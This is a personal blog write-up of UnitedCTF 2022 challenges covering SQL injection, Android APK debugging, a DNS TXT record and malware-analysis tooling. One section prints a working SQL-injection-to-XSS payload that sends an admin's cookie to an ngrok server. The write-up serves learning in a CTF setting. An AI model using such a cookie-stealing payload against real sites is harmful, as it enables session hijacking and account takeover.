Last year I was supposed to do a post on UnitedCTF web challenge but I ran out of gas. Too bad there was tons of cool stuff: a series of file upload challenges, a website featuring a cute dog, a pentest on a fake government website and hacking techniques based on the Vaxicode mobile app. In this post I'll show you how I combined SQL injection and XSS, an introductory mobile app pentest and one thing I learned about DNS. I will also talks about the track made by Desjardins, which was my favorite this year. As always the challenge are available on [Github](https://github.com/UnitedCTF/UnitedCTF-2022) so you can try them yourselves

## Wisdom 1: Know your SQL injection

![Wisdom website](/will-hack-for-coffee/assets/images/unitedctf2022/wisdom-website.png)

So this is a simple website where you can search for quotes. Using quotes didn't break the app but this payload did: 

![Error](/will-hack-for-coffee/assets/images/unitedctf2022/error.png)

I could then found that two columns were expected:

![First injection](/will-hack-for-coffee/assets/images/unitedctf2022/first-injection.png)

Then I had to guess what type of database it was using by trials and errors, [thank you for payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md):
![Finding database type](/will-hack-for-coffee/assets/images/unitedctf2022/finding-database-type.png)

Then I could extract the (simple) schema. Using an expression that evaluated to false at the left to simplify display:
![Finding database type](/will-hack-for-coffee/assets/images/unitedctf2022/extracting-schema.png)

Finally I got my flag:

![Finding database type](/will-hack-for-coffee/assets/images/unitedctf2022/wisdom-first-flag.png)

## Wisdom 2: XSS or SQL injection? Why not both?

There is a link called Found a bug, let's take a look:

![Bug submit page](/will-hack-for-coffee/assets/images/unitedctf2022/bug-submit.png)

It looks like if you put an url there, the admin will visit it. If there was XSS on his site we could steal his cookie, impersonate him and try to escalate our privilege. Sadly there is only SQL injection... hmmm?

![Reflected XSS](/will-hack-for-coffee/assets/images/unitedctf2022/reflected-xss.png)

So I managed to inject an XSS in the page by using this payload: 

``
' union select '<script>alert("Reflected XSS")</script>',null -- 
``

So now we need to redirect his cookie to a server we control. During the CTF, the website was on the internet and not hosted on my local server using Docker. For those well versed in networking (not me) it could be done using port forwarding but I used a tool call ngrok that simplified my network setting. It's a tool that is worth learning! Just register for a free account and [get started](https://ngrok.com/), it's only two steps to install and configure. After this launch ngrok on your machine forwarding to port 80 following the Getting started section. Then browse to the Endpoint page.

![ngrok](/will-hack-for-coffee/assets/images/unitedctf2022/ngrok.png)

This is the url to access your local server, I used a simple python server listening on port 80.

**Be careful with that tough because you are opening a door into your home network for all those malicious hackers and bots roaming the internet. So close Ngrok after you are finished and don't serve sensitive files with your python server! xD**

So I send this link for the admin to inspect (code formating the url looks kinda bad but it prevent accidental XSS in my website!):

``
http://wisdom.ctf.unitedctf.ca/?q=' union select '<script>document.location="https://xxx-xxx-xxx-xxx-xxx.ngrok.io?c=".concat(document.cookie);</script>',1 -- 
``

Looking at my python server:

![Capturing cookie](/will-hack-for-coffee/assets/images/unitedctf2022/capturing-cookie.png)

The first part of the flag is a reference to HTTP-Only which is a [setting for your cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrict_access_to_cookies) that it should only be accessible by HTTP (excluding javascript). That setting kind of confused me at first as it doesn't mean unencrypted transmission but refer to the HTTP protocol. The cookie settings for transmitting cookies only via HTTPS is called Secure. The second part of the flag refer to [Content-Security-Policy header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy) that indicate which resources are allowed to load.

## Mobile app 1: Debugging

Some students from [ApplETS](https://clubapplets.ca/) made a small mobile app track. I didn't knew anything about mobile app reversing but I was eager to try it.

![Mobile app 1](/will-hack-for-coffee/assets/images/unitedctf2022/mobile1.png)

First challenge is about SQL injection, no problemo! Oh I only have an APK? I wanted to try it for a long time so I installed [Android Studio](https://developer.android.com/studio). I could then open the APK and run it in a simulated device. 

![Debugging APK](/will-hack-for-coffee/assets/images/unitedctf2022/debugging-apk.png)

I know it's SQLlite and I'm all warmed up so quickly I had the first challenge done:

![First mobile flag](/will-hack-for-coffee/assets/images/unitedctf2022/first-mobile-flag.png)

## Mobile app 2: Grab that database

![Mobile app 2](/will-hack-for-coffee/assets/images/unitedctf2022/mobile2.png)

So I had to browse the database but where is it? The database seems to be created by the APK, possibly by code. By running the app in debug you can browse the device file. You might not be allowed access on a non rooted device but I am on a virtual device that I fully control. Googling the location of the database, I found that:

![Device explorer](/will-hack-for-coffee/assets/images/unitedctf2022/device-explorer.png)

Copying this database on my machine, I could then browse it using sqllitedb in Kali and found the second flag.

![Browsing the database](/will-hack-for-coffee/assets/images/unitedctf2022/second-mobile-flag.png)

## Mobile app 3: Decompilation

![Mobile app 3](/will-hack-for-coffee/assets/images/unitedctf2022/mobile3.png)

Why use a tool when you can Android Studio? Here is the third flag:

![Third mobile flag](/will-hack-for-coffee/assets/images/unitedctf2022/third-mobile-flag.png)

Really glad I took some time to look at Android Studio. I might dabble with it further eventually. Maybe an app to locate and rate the nearest mobile toilet when stuck in traffic due to roadworks?

![Mobile toilet](/will-hack-for-coffee/assets/images/unitedctf2022/mobile-toilet.png)

## Sus domain

The next challenge I wanted to show you, I only found after the CTF by looking at the solution:

![Suspicious domain](/will-hack-for-coffee/assets/images/unitedctf2022/sus-domain.png)

I knew it was related to DNS and I knew TXT was a type of record. But I investigated the domain (I didn't realized the DNS entry for the subdomain would be different) instead of the subdomain. 

![Looking at DNS txt record](/will-hack-for-coffee/assets/images/unitedctf2022/dig-subdomain.png)

Here it was, encoded in base64: FLAG-4eef1b53ba09dfd7fdb7037b488839770.

The text record can contain arbitrary text and this string is probably fake but it's a legit way for company, like Google, to verify you own this domain. It's also used to store DMARC, SPF and DKIM information for email authentication, so I learned that.

## Desjardins: Dynamic Malware analysis

It's the second time I completed the Desjardins track and it was even better then the last ibe. The idea of the challenge is to run a malware in a controlled environment and ultimately find and impersonate a [C2](https://www.varonis.com/blog/what-is-c2) server. There is already two [good](https://ch0ufleur.dev/desjardins-analyse-dynamique-de-logiciel-malveillant/) [writeup](https://github.com/PeLouZe/UnitedCTF22-Desjardins) on it but I used slightly different tooling so I toy with the idea of writing a post about it too. I used a [free image of windows 11](https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/) and I installed a distribution from Mandiant specialized in reverse engineering and malware analysis called [Flare VM](https://www.mandiant.com/resources/blog/flare-vm-update).

Basically the malware interrogate a well known website before trying to contact his C2 server and he is using https so you need to use a proxy and configure the TLS certificate beforehand. I used [Procmon](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon), Wireshark and Burp. It could have been solved using only those but I discovered and configured the tool [mitmproxy](https://mitmproxy.org/) and I also used another tool called [fakenet](https://github.com/mandiant/flare-fakenet-ng) to impersonate the C2 server. So I now have a really nice VM to play with for those pesky Windows CTF challenge.

## Conclusion

UnitedCTF is my favorite because there is a lot of challenges designed to teach the basic of hacking to beginners by pointing to ressources and tools. There is also original content that I didn't see in any other CTF like the Shellcoding track or ReDoS last year. Thanks to the students who took the time to make this great event and thanks Desjardins for that interesting challenge!
